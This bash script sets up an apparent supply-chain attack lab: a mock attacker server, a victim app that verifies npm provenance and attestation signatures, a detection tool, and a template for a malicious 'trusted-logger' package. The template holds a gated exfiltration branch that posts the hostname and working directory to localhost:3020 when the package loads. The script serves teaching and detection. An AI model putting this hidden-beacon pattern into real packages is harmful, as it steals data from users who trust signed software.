#!/bin/bash
# SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCENARIO_DIR}"
# shellcheck disable=SC1091
source "${SCENARIO_DIR}/../_shared/enable-testbench.sh"

# Scenario 20: npm Provenance / Attestation Abuse
# A compromised CI workflow signs both npm provenance and a GitHub artifact
# attestation for a malicious package. The victim verifies both signatures and
# loads the package, which then exfiltrates mock data to localhost:3020.

set -e

echo "================================================"
echo "🔧 Scenario 20: npm Provenance / Attestation Abuse"
echo "================================================"
echo ""

echo "📋 Checking prerequisites..."
command -v node >/dev/null 2>&1 || { echo "❌ Node.js not installed"; exit 1; }
command -v npm >/dev/null 2>&1 || { echo "❌ npm not installed"; exit 1; }

echo "✅ Node.js version: $(node --version)"
echo "✅ npm version: $(npm version)"
echo ""

echo "📁 Creating directory structure..."
mkdir -p infrastructure
mkdir -p victim-app/keys
mkdir -p detection-tools
mkdir -p templates
mkdir -p malicious-package/trusted-logger
echo "✅ Directories created"
echo ""

echo "📝 Creating mock attacker server..."
cat > infrastructure/mock-server.js << 'EOF'
/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — Supply Chain Attack Simulator
 * Mock Attacker Server (Scenario 20)
 * Receives and logs exfiltrated data from the provenance-abuse lab.
 */

require('../../_shared/scenario-provenance');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3020;
const logFile = path.join(__dirname, 'captured-data.json');

if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    req.on('data', (chunk) => (body += chunk.toString()));
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        console.log('\n🎯 CAPTURED DATA (provenance-abuse):');
        console.log(JSON.stringify(data, null, 2));
        console.log('─'.repeat(50));

        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        const captureEntry = { timestamp: new Date().toISOString(), data };
        captures.captures.push(captureEntry);
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Data received' }));

        try {
          require('../../../detection-tools/es/forward-capture')
            .forwardCaptureIfEnabled(__dirname, captureEntry)
            .catch(() => {});
        } catch (_) {
          /* optional ES forwarding; capture already persisted */
        }
      } catch (e) {
        console.error('Error processing data:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
    return;
  }

  if (req.method === 'GET' && req.url === '/captured-data') {
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
    return;
  }

  if (req.method === 'DELETE' && req.url === '/captured-data') {
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Data cleared' }));
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log('🎭 Mock Attacker Server Started (Scenario 20)');
  console.log(`Listening on http://localhost:${PORT}`);
});
EOF
chmod +x infrastructure/mock-server.js
echo '{"captures": []}' > infrastructure/captured-data.json
echo "✅ Mock server created"
echo ""

echo "📦 Writing victim application..."
cat > victim-app/package.json << 'EOF'
{
  "name": "victim-app",
  "version": "1.0.0",
  "private": true,
  "description": "Victim app for npm provenance / attestation abuse simulation",
  "main": "index.js",
  "dependencies": {
    "trusted-logger": "file:../malicious-package/trusted-logger"
  },
  "scripts": {
    "start": "node -r ../../_shared/testbench-env.js index.js"
  },
  "license": "MIT"
}
EOF

cat > victim-app/index.js << 'EOF'
/**
 * Victim application for Scenario 20.
 * Verifies the malicious package's npm provenance and GitHub artifact
 * attestation before loading it. Both signatures are valid because the
 * attacker compromised the CI signing key.
 */

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const appDir = __dirname;
const pkgDir = path.join(appDir, 'node_modules', 'trusted-logger');
const pubKeyPath = path.join(appDir, 'keys', 'provenance-public.pem');

function sha512(filePath) {
  return crypto.createHash('sha512').update(fs.readFileSync(filePath)).digest('hex');
}

function verifyBundle(bundlePath, publicKeyPem) {
  const bundle = JSON.parse(fs.readFileSync(bundlePath, 'utf8'));
  const statement = { ...bundle };
  delete statement.signature;

  const payload = Buffer.from(JSON.stringify(statement));
  const signature = Buffer.from(bundle.signature.sig, 'base64');
  const publicKey = crypto.createPublicKey(publicKeyPem);
  const valid = crypto.verify(null, payload, publicKey, signature);

  const subject = bundle.subject && bundle.subject[0];
  const indexDigest = sha512(path.join(pkgDir, 'index.js'));
  const digestMatch = subject && subject.digest && subject.digest.sha512 === indexDigest;

  return { valid, digestMatch, bundle };
}

console.log('Starting victim app (Scenario 20: npm Provenance / Attestation Abuse)...');

if (!fs.existsSync(pkgDir)) {
  console.error('❌ trusted-logger is not installed. Run: npm install');
  process.exit(1);
}

if (!fs.existsSync(pubKeyPath)) {
  console.error('❌ Public key not found. Run ./setup.sh first.');
  process.exit(1);
}

const publicKey = fs.readFileSync(pubKeyPath);
const provenance = verifyBundle(path.join(pkgDir, 'provenance.json'), publicKey);
const attestation = verifyBundle(path.join(pkgDir, 'attestation.sigstore.json'), publicKey);

console.log('Provenance signature valid:', provenance.valid ? '✅ YES' : '❌ NO');
console.log('Attestation signature valid:', attestation.valid ? '✅ YES' : '❌ NO');
console.log('Artifact digest match:', provenance.digestMatch && attestation.digestMatch ? '✅ YES' : '❌ NO');

if (!provenance.valid || !attestation.valid || !provenance.digestMatch || !attestation.digestMatch) {
  console.error('❌ Verification failed — refusing to load trusted-logger.');
  process.exit(1);
}

console.log('✅ All provenance and attestation checks passed — loading package.');

const logger = require('trusted-logger');
logger.log('info', 'Victim application started successfully');
EOF
echo "✅ Victim application created"
echo ""

echo "🦠 Writing malicious package template..."
cat > templates/malicious-package-template.js << 'EOF'
/**
 * trusted-logger — structured logging helper (educational simulation)
 *
 * This package carries a valid npm provenance statement and a valid GitHub
 * artifact attestation, both produced by a compromised CI workflow that
 * re-used the project's signing key. The victim verifies the signatures,
 * trusts the package, and loads it.
 */

const http = require('http');
const os = require('os');

function log(level, message) {
  const entry = { level, message, ts: new Date().toISOString() };
  console.log(JSON.stringify(entry));
  return entry;
}

// Compromised CI workflow inserted this branch before publishing.
// In production it would be obfuscated; here it is gated for lab safety.
if (process.env.TESTBENCH_MODE === 'enabled') {
  const payload = {
    attack: 'npm-provenance-attestation-abuse',
    package: 'trusted-logger',
    version: '9.9.9',
    hostname: os.hostname(),
    cwd: process.cwd(),
    timestamp: new Date().toISOString()
  };

  const data = JSON.stringify(payload);
  const req = http.request({
    hostname: 'localhost',
    port: 3020,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  }, () => {});

  req.on('error', () => {});
  req.write(data);
  req.end();
}

module.exports = { log };
EOF
echo "✅ Malicious package template created"
echo ""

echo "🔍 Writing detection tool..."
cat > detection-tools/provenance-abuse-detector.js << 'EOF'
#!/usr/bin/env node

/**
 * Provenance Abuse Detector (Scenario 20)
 * Finds behavioral indicators in a package that has valid provenance and
 * attestation. Valid signatures prove origin and integrity, not safety.
 */

const fs = require('fs');
const path = require('path');

const target = process.argv[2] || 'victim-app';
const appDir = path.isAbsolute(target) ? target : path.join(process.cwd(), target);
const pkgDir = path.join(appDir, 'node_modules', 'trusted-logger');
const indexPath = path.join(pkgDir, 'index.js');

function readFile(p) {
  try {
    return fs.readFileSync(p, 'utf8');
  } catch {
    return '';
  }
}

function hasAny(text, needles) {
  return needles.some((n) => text.includes(n));
}

console.log('🔍 Provenance Abuse Detector (Scenario 20)\n');

const index = readFile(indexPath);
if (!index) {
  console.error('❌ trusted-logger not installed. Run: cd victim-app && npm install');
  process.exit(1);
}

function hasAll(text, needles) {
  return needles.every((n) => text.includes(n));
}

const findings = [];
if (index.includes('http.request')) findings.push('Network request in package code');
if (hasAny(index, ['localhost:3020', '127.0.0.1:3020']) || hasAll(index, ['localhost', '3020'])) {
  findings.push('Beacon to mock attacker server');
}
if (index.includes('TESTBENCH_MODE')) findings.push('TESTBENCH_MODE-gated malicious branch');
if (hasAny(index, ['exfil', 'collect'])) findings.push('Exfiltration / collect reference');

const hasProvenance = fs.existsSync(path.join(pkgDir, 'provenance.json'));
const hasAttestation = fs.existsSync(path.join(pkgDir, 'attestation.sigstore.json'));

console.log('Package path:', pkgDir);
console.log('Has npm provenance file:', hasProvenance ? 'YES' : 'NO');
console.log('Has GitHub artifact attestation file:', hasAttestation ? 'YES' : 'NO');

if (findings.length > 0) {
  console.log('\n🚨 Behavioral findings (despite valid provenance / attestation):');
  findings.forEach((f) => console.log(`  - ${f}`));
  console.log('\nConclusion: Provenance and attestation prove WHO built the package and');
  console.log('that the artifact was not tampered with after signing. They do NOT prove');
  console.log('the code is safe when the CI workflow or signing key is compromised.');
  process.exit(2);
}

console.log('\n✅ No obvious behavioral indicators found.');
process.exit(0);
EOF
chmod +x detection-tools/provenance-abuse-detector.js
echo "✅ Detection tool created"
echo ""

echo "🔑 Generating signing keys and signed provenance / attestation..."
node infrastructure/build-provenance.js
echo ""

echo "📦 Installing victim application dependencies..."
rm -rf victim-app/node_modules victim-app/package-lock.json
cd victim-app
npm install
cd ..
echo ""

echo "================================================"
echo "✅ Setup Complete!"
echo "================================================"
echo ""
echo "🎯 Next Steps (two terminals):"
echo ""
echo "Terminal A — mock attacker server:"
echo "   node infrastructure/mock-server.js"
echo ""
echo "Terminal B — run the victim:"
echo "   cd victim-app"
echo "   npm start"
echo ""
echo "Detection (from scenario root):"
echo "   node detection-tools/provenance-abuse-detector.js victim-app"
echo ""
echo "Verify capture:"
echo "   curl -s http://127.0.0.1:3020/captured-data"
echo ""
echo "📖 Read full instructions: cat README.md"
echo ""
